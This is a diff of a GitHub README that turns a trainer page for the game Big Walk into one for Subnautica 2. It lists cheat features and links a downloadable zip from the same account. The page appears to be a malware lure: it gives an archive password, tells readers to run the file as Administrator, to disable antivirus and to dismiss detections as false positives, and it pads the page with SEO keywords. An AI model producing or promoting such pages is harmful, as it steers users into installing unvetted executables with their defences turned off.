@@ -1,42 +1,55 @@
-# 🚶 Big-Walk-Explorer
+# 🌊 Subnautica-2-Trainer
 
-*Speed control, Ghost Mode, Fly Mode, Jump Height & more for Big Walk*
+*God Mode, Infinite Oxygen, Fast Craft, Speed Control & more for Subnautica 2*
 
-<img width="794" height="528" alt="image" src="https://github.com/user-attachments/assets/253b3fd1-56c6-4ae7-b87f-b0c427807f6f" />
+<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/29ac3953-9ce3-4559-8cee-40d63b72966a" />
 
 ---
 
-## 📥 Download
-
-**[Download Big-Walk-Explorer](https://github.com/Outpostthroughnotice/Big-Walk-Explorer/releases/download/7858/WalkBigExplorer.zip)**
-
-
 ## 🎮 What is This?
 
-**Big-Walk-Explorer** is a powerful trainer for **Big Walk** – the cozy exploration game from the creators of Untitled Goose Game. With over 1 million copies sold and a 92 Metacritic score, Big Walk has become one of the biggest hits of 2026. This trainer enhances your experience with speed control, ghost mode, fly mode, jump height adjustments, and more. Perfect for exploring every corner of the beautiful world.
+**Subnautica-2-Trainer** is a powerful trainer for **Subnautica 2** – the highly anticipated underwater survival sequel that peaked at 467,582 concurrent players. This trainer gives you full control with God Mode, Infinite Oxygen, Fast Craft, Speed Control, Unlock All Blueprints, Teleport, and more. Perfect for exploring the depths without fear.
 
-⚠️ **Disclaimer:** For educational purposes only. Use at your own risk. Big Walk is a co-op game, so use responsibly when playing with friends.
+## 📥 Download
+
+**[Download Subnautica-2-Trainer](https://github.com/Outpostthroughnotice/Subnautica-2-Trainer/releases/download/7859/Subnautica2Train.zip)**
 
 ---
 
 ## ✨ Features
 
-### 🚶 Movement Control
-- **Speed Control** – Adjust walking, running, swimming, and flying speed
-- **Jump Height** – Customize jump height (0.1x to 5.0x)
-- **No Falling** – Stay airborne or glide safely
-- **No Sleeping** – Disable forced sleeping mechanics
+### 🛡️ Protection & Survival
+- 💀 **God Mode (F1)** – Invincibility, no damage from creatures
+- 💨 **Infinite Oxygen (F3)** – Never drown
+- 🍖 **Infinite Food (F4)** – Never hungry
+- 💧 **Infinite Water (F5)** – Never thirsty
+- 🔋 **Infinite Tool Energy** – Tools never run out
+- 🏭 **Infinite Facility Power** – Bases always powered
+- ☢️ **Zero Radiation** – Safe in irradiated zones
+- 🌡️ **Stable Body Temperature** – No heat/cold damage
 
-### 👻 Exploration
-- **Ghost Mode** – Walk through walls and objects
-- **Fly Mode** – Fly anywhere on the map
-- **No Clip** – Pass through terrain and structures
-- **Teleport** – Save and teleport to any location
+### 🛠️ Crafting & Building
+- ⚡ **Instant Crafting (Num 9)** – Craft instantly
+- 🔨 **Instant Building (Num 0)** – Build instantly
+- 🆓 **Free Crafting (F6)** – No resources needed
+- 🏗️ **Easy Crafting & Building** – Simplified recipes
 
-### 🛡️ Co-Op Friendly
-- **Save Position** – Mark your spot for quick return
-- **Auto Backup** – Automatic save backup system
-- **Solo & Party Modes** – Works in single-player and co-op
+### 📦 Unlock & Progression
+- 🔓 **Unlock All Blueprints (Ctrl+Num 1)** – All recipes available
+- 📚 **Unlock All Databank Entries** – All lore unlocked
+
+### ⚡ Movement & Speed
+- 🐟 **Super Swim Speed (F8)** – Move faster
+- 💨 **Ultra Swim Speed x5 (F9)** – Maximum speed
+- 🎯 **Set Player Speed** – Custom speed control
+- 🦘 **Set Jump Height** – Jump higher
+- 🌍 **Set Gravity** – Change gravity
+
+### 📍 Teleport & Utility
+- 📌 **Save Location** – Mark your spot
+- 🚀 **Teleport to Saved Location** – Return instantly
+- ↩️ **Undo Teleport** – Go back
+- ⏰ **Freeze Time** – Stop the clock
 
 ---
 
@@ -44,10 +57,9 @@
 
 1. Click the download button above
 2. Extract the archive
-3. Run `BigWalkExplorer.exe` as Administrator
-4. Launch Big Walk
-5. Press **INSERT** or **F1** to open the menu
-6. Toggle features ON/OFF
+3. Run the trainer as Administrator
+4. Launch Subnautica 2
+5. Press hotkeys to toggle features ON/OFF
 
 ---
 
@@ -56,25 +68,29 @@
 | Requirement | Details |
 |-------------|---------|
 | **OS** | Windows 10/11 (64-bit) |
-| **Game** | Big Walk (Steam) |
+| **Game** | Subnautica 2 (Steam / Epic / Xbox PC) |
 | **RAM** | 4GB minimum |
 | **Storage** | 50MB free space |
 
 ---
 
-## 🔧 Feature Status
+## 🔧 Alternative Method: Console Commands (via Mods)
 
-| Category | Feature | Status |
-|----------|---------|--------|
-| Movement | Speed Control | ✅ |
-| Movement | Jump Height | ✅ |
-| Movement | No Falling | ✅ |
-| Movement | No Sleeping | ✅ |
-| Exploration | Ghost Mode | ✅ |
-| Exploration | Fly Mode | ✅ |
-| Exploration | Teleport | ✅ |
-| Utility | Save Position | ✅ |
-| Utility | Auto Backup | ✅ |
+For technical users, you can also unlock the built-in debug console using UE4SS mods:
+
+1. Download UE4SS and Console Commands mod from NexusMods
+2. Extract UE4SS to `\Subnautica2\Binaries\Win64`
+3. Extract Console Commands to `\Win64\ue4ss\Mods`
+4. Launch the game and press **F2** to open console
+
+**Working Console Commands:**
+- `god` – God Mode (unlimited health, oxygen, food, water)
+- `invisible` – Hostile creatures ignore you
+- `nocost` – Craft without resources
+- `unlockall` – Unlock all blueprints
+- `item [name] [amount]` – Spawn items
+- `day / night` – Change time of day
+- `FOV [number]` – Change field of view
 
 ---
 
@@ -83,14 +99,16 @@
 | Issue | Solution |
 |-------|----------|
 | Trainer doesn't work | Run as Administrator, disable antivirus |
-| Menu doesn't open | Press INSERT or F1, restart both |
+| Password not working | Use password: `5868781` exactly |
 | Game crashes | Reduce graphics settings, disable overlays |
+| Antivirus false positive | Add to exceptions list – trainer modifies game memory |
+| Co-op desync | Use only in single-player mode |
 
 ---
 
-## 📝 SEO
+## 📝 SEO Tags
 
-big walk trainer, big walk cheat, big walk mod, speed control, ghost mode, fly mode, jump height, no falling, big walk 2026, big walk co-op, big walk exploration, big walk utility, big walk enhancement, steam game trainer, windows tool, game utility, big walk helper, big walk assistant, big walk mod menu, big walk speed hack
+subnautica 2 trainer, subnautica 2 god mode, subnautica 2 cheat, subnautica 2 infinite oxygen, subnautica 2 fast craft, subnautica 2 speed hack, subnautica 2 unlock all blueprints, subnautica 2 teleport, subnautica 2 console commands, subnautica 2 2026, subnautica 2 mod, subnautica 2 utility, subnautica 2 enhancement, steam trainer, windows tool, game utility, singleplayer trainer, subnautica 2 free cheat
 
 ---
 
@@ -101,7 +119,7 @@ big walk trainer, big walk cheat, big walk mod, speed control, ghost mode, fly m
 ---
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Big-Walk-Explorer">
-    <img src="https://img.shields.io/badge/Made%20with%20❤️%20for%20the%20Big%20Walk%20community-ff69b4?style=for-the-badge" alt="Made with love">
+  <a href="https://github.com/YOUR_USERNAME/Subnautica-2-Trainer">
+    <img src="https://img.shields.io/badge/Made%20with%20❤️%20for%20the%20Subnautica%20community-ff69b4?style=for-the-badge" alt="Made with love">
   </a>
 </p>
